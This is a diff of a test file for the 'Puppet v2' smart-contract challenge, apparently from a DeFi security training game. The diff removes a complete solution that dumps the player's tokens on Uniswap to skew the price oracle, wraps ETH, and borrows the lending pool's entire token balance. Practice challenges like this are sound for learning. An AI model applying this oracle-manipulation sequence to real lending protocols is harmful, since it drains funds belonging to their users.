@@ -83,18 +83,6 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        await token.connect(player).approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
-        await uniswapRouter.connect(player).swapExactTokensForETH(
-            PLAYER_INITIAL_TOKEN_BALANCE, 
-            1, 
-            [token.address, weth.address],
-            player.address, 
-            2n * 10n ** 10n,
-            {gasLimit: 1e6}
-        );
-        await weth.connect(player).deposit({value: 295n * 10n ** 17n});
-        await weth.connect(player).approve(lendingPool.address, 295n * 10n ** 17n);
-        await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
